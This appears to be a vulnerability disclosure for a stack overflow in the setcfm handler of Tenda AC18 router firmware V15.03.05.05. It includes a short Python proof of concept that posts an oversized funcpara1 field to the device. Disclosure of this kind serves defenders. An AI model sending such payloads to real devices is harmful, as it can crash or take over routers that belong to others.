## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda A18 V15.03.05.05 has a stack overflow vulnerability located in the `formSetCfm` function. This function accepts the `funcpara1` parameter from a POST request and passes it to the `sub_4EA34` function. Within `sub_4EA34`, the array `s` is fixed at 64 bytes. However, since the user has control over the input of `funcpara1`, the statement `sprintf(s, "%s.list%d", a1, v11);` leads to a buffer overflow. The user-supplied `funcpara1` can exceed the capacity of the `s` array, thus triggering this security vulnerability.

![image-20240308165412900](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165412900.png)

![image-20240308165426906](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165426906.png)

![image-20240308165436222](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165436222.png)

## POC

```python
import requests as re

s = re.Session()
url_base = 'http://192.168.84.101/'

# Send payload
url = url_base + 'goform/setcfm'
data = {
        'funcname': 'save_list_data', 
        'funcpara1': b'a'*0x500, 
        'funcpara2':'aaaaaa'
}

res = re.post(url, data=data)
```

![image-20240308165514005](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165514005.png)